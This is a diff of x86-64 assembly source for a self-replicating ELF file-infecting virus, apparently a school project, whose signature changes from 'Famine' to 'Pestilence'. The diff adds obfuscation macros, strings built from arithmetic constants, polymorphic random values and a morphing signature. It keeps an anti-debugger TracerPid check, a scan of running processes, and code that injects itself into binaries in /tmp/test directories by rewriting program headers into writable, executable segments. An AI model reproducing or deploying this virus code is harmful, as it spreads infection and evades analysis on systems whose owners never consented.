@@ -1,64 +1,119 @@
-%include "includes/header_no_obf.s"
+%include "includes/header.s"
 
 SECTION .TEXT EXEC WRITE
 global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
+OBF_GENERIC
 PUSH
+OBF_GENERIC
+
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
 
+
+OBF_POLY_1
+
+
+OBF_GENERIC
 .check_status:		;open the /proc/self/status
+OBF_GENERIC
 xor rdi ,rdi
-lea rdi, [rel pfile]
+lea rdi, STACK(famine.file_path)
+
+
+;BUILD STRING /proc/self/status FOR OBF
+OBF_GENERIC
+mov rsi, 0x1E40AEC66F2F
+OBF_GENERIC1
+mov rax, 0x1122C0AC0100
+add rsi, rax
+mov qword[rdi], rsi
+add rdi, 6
+mov rsi, 0x500A87BF3341
+OBF_GENERIC1
+mov rax, 0x2324DEAD3232
+add rsi, rax
+mov qword[rdi], rsi
+add rdi, 6
+mov rsi, 0x72729481A8
+OBF_GENERIC
+mov rax, 0x0102DFDFCC
+add rsi, rax
+mov qword[rdi], rsi
+sub rdi, 12
+
+OBF_GENERIC
+
+
 mov rsi, O_RDONLY
 mov rax, _open
 syscall
 cmp rax, 0
+OBF_GENERIC
 jl _exx
 
+OBF_GENERIC2
 lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
 mov rdi, rax   ; fd from previous read
 mov rdx, 110
 mov rax, _read
 syscall
+cmp rax, 0
+jb _exx_pop
 
 lea r12, STACK(famine.status_str)
 mov r11, 7
+OBF_GENERIC
 .loop_status:
+OBF_GENERIC2
 inc r12
 cmp byte[r12], 0x0a
 jne .nope
+OBF_GENERIC
 dec r11
 cmp r11, 0
 je .check_trcr
 .nope:
+OBF_GENERIC1
 loop .loop_status
 
 .check_trcr:
 add r12, 12
+OBF_GENERIC2
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 ;jne _exx_pop
 
 
 
 .opendir_proc:
-	lea rdi, [rel pdir]
+	OBF_GENERIC
+	lea rdi, STACK(famine.commpath)
+	mov rsi, 0x13203C936162
+	OBF_GENERIC2
+	lea rdi, STACK(famine.commpath)
+	mov rax, 0x1C4332DF0ECD
+	add rsi, rax
+	mov qword[rdi], rsi
 	mov rsi, O_RDONLY | O_DIRECTORY
 	mov rax, _open
 	syscall
+	OBF_GENERIC1
 	test eax, eax
 	jl _exx_pop
 	mov r14, rax
 
 .readdir_proc:
+	OBF_GENERIC
 	mov rdx, DIRENT_ARR_SIZE
 	lea rsi, STACK(famine.dirents_proc)
 	mov rdi, r14
 	mov rax, _getdents
 	syscall
 	test rax, rax
+	OBF_GENERIC
 	jle .closedir_proc
+	OBF_GENERIC2
 	mov r13, 0
 	mov r12, rax
 	call .read_file
@@ -66,6 +121,7 @@ cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 
 .closedir_proc:
 	mov rdi, r14
+	OBF_GENERIC2
 	mov rax, _close
 	syscall
 	jmp .OUI
@@ -74,9 +130,11 @@ cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 .read_file:
 	lea rdi, STACK(famine.dirents_proc)
 	add rdi, r13
+	OBF_GENERIC2
 	movzx edx, word[rdi+dirent.d_reclen]
 	mov al, byte[rdi + rdx - 1]
 	add rdi, dirent.d_name
+	OBF_GENERIC2
 	add r13, rdx
 	cmp al, DT_DIR
 	jne .nextfile_proc
@@ -84,55 +142,57 @@ cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 
 
 ;compute commfile path
-lea r11, [rel pdir]
 xor r10, r10
 
 .dirname_proc:
 	lea rsi, STACK(famine.commpath)
-	mov al, byte[r11]
-	mov byte[rsi + r10], al
-	inc r10
-	inc r11
-	cmp r10, 6
+	mov rax, 0x13203C936162
+	OBF_GENERIC2
+	mov r11, 0x1C4332DF0ECD
+	add rax, r11
+	mov qword[rsi], rax
+	add r10, 6
 	jb .dirname_proc
 
 .filename_proc:
 	mov al, byte[rdi]
 	mov byte[rsi + r10], al
 	inc r10
+	OBF_GENERIC2
 	inc rdi
 	cmp byte[rdi], 0
 	jne .filename_proc
 
-lea r11, [rel pname]
-mov rdx, 0
+
 .commfile:
-	mov al, byte[r11]
-	mov byte[rsi + r10], al
-	inc r11
-	inc r10
-	inc rdx
-	cmp rdx, 5
-	jne .commfile
+	mov rax, 0x5CAEC3C0FF
+	OBF_GENERIC
+	mov r11, 0x10BEABA230
+	add rax, r11
+	mov qword[rsi + r10], rax
+	add r10, 6
+	OBF_GENERIC2
 	mov byte[rsi + r10], 0
 
 ;open the commfile
 	xor rsi, rsi
 	mov rax, _open
 	lea rdi, STACK(famine.commpath)
+	OBF_GENERIC1
 	mov rdx, O_RDWR
 	syscall
 	test eax, eax
 	jl .nextfile_proc
 
 ;read the commfile
-	push rax
+	OBF_PUSH_RAX
 	mov rdi, rax
 	mov rax, _read
+	OBF_GENERIC2
 	lea rsi, STACK(famine.commpath)
 	mov rdx, 90
 	syscall
-	pop r9
+	OBF_POP_R9
 	test eax, eax
 	jl .close_proc
 	mov byte[rsi + rax - 1], 0x0
@@ -141,6 +201,7 @@ mov rdx, 0
 	cmp rax, 0
 	je .done
 	.close_proc:
+	OBF_GENERIC2
 	mov rdi, r9
 	mov rax, _close
 	syscall
@@ -149,6 +210,7 @@ mov rdx, 0
 
 .strcmp:
 	mov r10b, BYTE [rdi]
+	OBF_GENERIC2
 	mov r11b, BYTE [rsi]
 	cmp r10b, 0
 	je .end_cmp
@@ -157,17 +219,19 @@ mov rdx, 0
 	cmp r10b, r11b
 	jne .end_cmp
 	inc rdi
+	OBF_GENERIC1
 	inc rsi
 	jmp .strcmp
 
 .end_cmp:
 	movzx rax, r10b
 	movzx rbx, r11b
+	OBF_GENERIC
 	sub rax, rbx
 	ret
 
 .done:
-	pop rdi		; this pop is required in case of Exit from strcmp cause we did a CALL in readdir_proc  and must pop its address
+	OBF_POP_RDI		; this pop is required in case of Exit from strcmp cause we did a CALL in readdir_proc  and must pop its address
 	jmp _exx_pop
 
 .nextfile_proc:
@@ -176,45 +240,64 @@ mov rdx, 0
 	ret
 
 
+.get_random:
+	push rdi
+	push rsi
+	push rax
+	push rdx
+
+	lea rdi, [rel random]
+	mov rsi, O_RDONLY
+	mov rax, _open
+	syscall					; OPEN /dev/urandom  EXIT if not work
+	cmp rax, 0
+	jl	.err_ex
+
+	mov rdi, rax		; fd to read
+	mov rax, _read
+	mov rdx, 4
+	lea rsi, STACK(famine.tmp_rand)
+	syscall				; READ 8 RANDOM BYTE<3
+	
+	mov rax, _close
+	syscall
+
+	pop rdx
+	pop rax
+	pop rsi
+	pop rdi
+	ret
+	.err_ex:
+	pop rdx
+	pop rax
+	pop rsi
+	pop rdi
+	pop rdi
+	pop rdi
+	jmp _exx_pop
+
+
+
 .OUI:
 jmp .enc_start
+	OBF_GENERIC
 DECYPHER
+	OBF_GENERIC
 
 
 .enc_start:
+	OBF_GENERIC1
 	mov rax, _fork
 	syscall
 	cmp rax, 0
 	jne _exx_pop
 
-.get_rand_key:
-	lea rsi, STACK(famine.morph_sign)	; load morph iterator for signature
-	mov rsi, 0
 
-	lea rdi, [rel random]
-	mov rsi, O_RDONLY
-	mov rax, _open
-	syscall					; OPEN /dev/random  EXIT if not work
-	cmp rax, 0
-	jl	_exx_pop
-	push rax
-
-	mov rdi, rax		; fd to read
-	mov rax, _read
-	mov rdx, 1
-	lea rsi, STACK(famine.key)
-	syscall				; READ 2 byte, 1 for key, 1 for derivate
-	
-	pop rax
-	mov rdi, rax		; fd to read
-	mov rax, _read
-	mov rdx, 1
-	lea rsi, STACK(famine.factor)
-	syscall				; READ 2 byte, 1 for key, 1 for derivate
-	lea rdi, [rel infect_dir] ; load dir str
-
+lea rdi, [rel infect_dir] ; load dir str
 .opendir:
 	mov r14, rdi
+	OBF_GENERIC1
+	OBF_GENERIC
 	mov rsi, O_RDONLY | O_DIRECTORY
 	mov rax, _open
 	syscall				;	open directory
@@ -240,6 +323,7 @@ DECYPHER
 	movzx edx, word[rdi + dirent.d_reclen]
 	mov al, byte[rdi + rdx - 1]
 	add rdi, dirent.d_name
+	OBF_GENERIC1
 	add r13, rdx
 	cmp al, DT_REG
 	jne .nextfile
@@ -278,6 +362,7 @@ process:
 	jnz .dirname
 	mov rsi, rax
 
+	OBF_GENERIC
 .filename:
 	movsb			; append filename to dirname to get full path
 	cmp byte[rsi - 1], 0
@@ -292,6 +377,7 @@ process:
 	test eax, eax
 	jl .return
 	mov STACK(famine.file_fd), rax		; save result from open to stack
+	OBF_GENERIC1
 
 				;stat
 	lea rsi, STACK(famine.stat)
@@ -326,6 +412,7 @@ process:
 .unmap:
 	mov rsi, STACK(famine.file_size)
 	mov rdi, STACK(famine.file_data)
+	OBF_GENERIC1
 	mov rax, _munmap
 	syscall
 
@@ -362,8 +449,9 @@ check_elf64:
 
 inject_self:
 	push r13		; save registers in case we need to restore 
-	push r14
-	push r15
+	OBF_OVERWRITE_PUSHR14R15
+
+
 	mov r15, rdi ; save phdr[0] offset to r15
 	mov rdx, qword [rdi + elf64_ehdr.e_entry]
 	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
@@ -386,15 +474,49 @@ inject_self:
 	jmp .segment
 
 	.infect:
-	push rdi ; save phdr to infect offset to  stack
+	OBF_PUSH_RDI ; save phdr to infect offset to  stack
 
+.get_rand_key:
+	OBF_GENERIC1
+	lea rdi, [rel random]
+	mov rsi, O_RDONLY
+	mov rax, _open
+	syscall					; OPEN /dev/urandom  EXIT if not work
+	cmp rax, 0
+	jl	_exx_pop
+
+	OBF_PUSH_RAX
+	mov rdi, rax		; fd to read
+	mov rax, _read
+	mov rdx, 2
+	lea rsi, STACK(famine.key)
+	syscall				; READ 2 byte, 1 for key, 1 for derivate
+	
+	OBF_POP_RAX
+	mov rdi, rax		; fd to read
+	mov rax, _read
+	mov rdx, 1
+	lea rsi, STACK(famine.factor)
+	syscall				; READ 2 byte, 1 for key, 1 for derivate
+	mov rax, _close
+	syscall
+
+OBF_GENERIC1
 ; get target End of file
 	mov rdi, STACK(famine.file_fd) ; target fd to rdi
 	mov rsi, 0 ; offset 0
 	mov rdx, END_SEEK
 	mov rax, _lseek
+OBF_GENERIC1
 	syscall
-	push rax; save eof from lseek to stack
+	OBF_PUSH_RAX; save eof from lseek to stack
+
+;Here we check a presence of signature in case of a double PT_NOTE crap
+	mov r13, STACK(famine.file_data)
+	add r13, rax
+	sub r13, BEGIN_SIGNATURE_OFFSET_FORM_END
+	cmp byte[r13], 'F'
+	je .return_pop
 
 	; get delta  ( address at execution time)
 	call .delta
@@ -409,9 +531,11 @@ inject_self:
 	.loading_v:
 		mov r11b, byte[rsi]
 		mov [r10], r11b
+	OBF_GENERIC1
 		inc rsi
 		inc r10
 		dec rdx
+	OBF_GENERIC
 		cmp rdx, 0
 		jg .loading_v
 
@@ -423,6 +547,7 @@ inject_self:
 	lea r10, STACK(famine.tocypher)
 	add r10, KEY_OFFSET
 	mov r11b, STACK(famine.key)
+	OBF_GENERIC1
 	mov byte[r10], r11b
 
 	lea r10, STACK(famine.tocypher)
@@ -430,61 +555,81 @@ inject_self:
 	mov r11b, STACK(famine.factor)
 	mov byte[r10], r11b
 
+	push r12
+	xor r12, r12
+	
 	lea r10, STACK(famine.tocypher)
 	add r10, SIGNATURE_OFFSET
-	mov r11b, STACK(famine.morph_sign)
+	mov r11b, STACK(famine.morph_sign_u)
+	mov r12b, STACK(famine.morph_sign_d)
+	cmp r11b, 7
+	jl .fp
+	inc r12b
+	mov r11, 0
+	.fp:
 	inc r11b
+	add byte[r10], r12b
+	inc r10
 	add byte[r10], r11b
-	add r10, 2
+	inc r10
+	add byte[r10], r12b
+	OBF_GENERIC1
+	inc r10
 	add byte[r10], r11b
-	add r10, 2
+	inc r10
+	add byte[r10], r12b
+	inc r10
 	add byte[r10], r11b
-	add r10, 2
+	inc r10
+	add byte[r10], r12b
+	inc r10
 	add byte[r10], r11b
-	add r10, 2
-	mov STACK(famine.morph_sign), r11
+	.done_finger:
+	mov STACK(famine.morph_sign_u), r11
+	mov STACK(famine.morph_sign_d), r12
 
-	push r12
+	call _start.get_random
+	lea r10,STACK(famine.tocypher)
+	add r10, POLY_OFFSET_1
+	mov r12, STACK(famine.tmp_rand)
+	mov dword[r10], r12d
+
 	CYPHER
 	pop r12
+
+	
 
 	mov rdi, STACK(famine.file_fd) ; fd to rdi
 	lea rsi, STACK(famine.tocypher)
 	mov rdx, _end - _start  ; virus size to rdx
-	pop r10 ; rax hold eof from lseek syscall 
-	push r10
+	OBF_POP_R10 ; rax hold eof from lseek syscall 
+	OBF_PUSH_R10
 	mov rax, _pwrite
 	syscall
 	cmp rax, 0
 	jbe .return
 
 	.edit_phdr:
-	pop rax				;RDI = the offset of patched PHEADER
-	pop rdi
-	push rdi
-	push rax
+	OBF_POP_RAX				;RDI = the offset of patched PHEADER
+	OBF_GENERIC
+	OBF_POP_RDI
+	OBF_PUSH_RDI
+	OBF_PUSH_RAX
 	mov dword [rdi], 1
 	mov eax, PF_R	; READ
 	or eax, PF_X	; EXEC
 	or eax, PF_W	; WRITE
 	mov dword [rdi + 4], eax   ;SET PERMS !
-	pop rax				; RAX = The offset of our injected V , (old EOF)
+	OBF_POP_RAX				; RAX = The offset of our injected V , (old EOF)
 	mov [rdi + 8], rax  ; set phdr.offset  = rax
 	mov r13, qword STACK(famine.stat + stat.st_size) ; load target size to r13
+	OBF_GENERIC1
 	add r13, 0xc000000 ; add vsize to r13
 	mov [rdi + 16], r13 ; edit  p_vaddr
 	mov [rdi + 24], r14 ; change paddr to new size
 	mov qword [rdi + 48], 0x200000  ; set align to 2mb
 	add qword [rdi + 32], _end - _start + 5
 	add qword [rdi + 40], _end - _start + 5
-
-	;	write it
-	mov rdi, STACK(famine.file_fd)
-	lea rsi, [rdi]
-	mov dx, PHDR_SIZE
-	mov r10, r14
-	mov rax, _pwrite
-	syscall
 
 	.edit_ehdr:
 	mov rdi, STACK(famine.file_data)
@@ -501,17 +646,19 @@ inject_self:
 
 	.jmp_wuw:
 	mov rdi , STACK(famine.file_fd)
+	OBF_GENERIC
 	mov rsi, 0
 	mov rdx, END_SEEK
 	mov rax, _lseek
 	syscall						; seek to file_end
 	
 ;	compute jump value
-	pop rdi ;   restore patched pheader 
+	OBF_POP_RDI ;   restore patched pheader 
 	mov rdx, [rdi + elf64_phdr.p_vaddr]
 	sub rdx, RETURN_JUMP_VALUE_OFFSET
 	sub r14, rdx
 	sub r14, _end - _start
+	OBF_GENERIC1
 	mov byte STACK(famine.jmp), JMP; jmp opcode
 	mov dword STACK(famine.jmp + 1), r14d
 
@@ -526,22 +673,25 @@ inject_self:
 
 	mov rax, _sync
 	syscall
+	jmp .return
+	.return_pop:
+	OBF_POP_RAX
+	OBF_POP_RDI
 	.return :
 		pop r15		; restore saved registers
+	OBF_GENERIC1
 		pop r14
 		pop r13
 		ret
 
+
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
-random			db			"/dev/random"
 enc_end:
 	db 0
-signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
-pfile			db			"/proc/self/status",0
-pdir			db			"/proc/", 0, 0, 0, 0
-pname			db			"/comm"
+signature		db			0x00, 'Pestilence version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
 forbidden		db			"test.out", 0
 famine_entry	dq			_start
+random			db			"/dev/urandom",0,0
 
 _exx_pop:
 POP
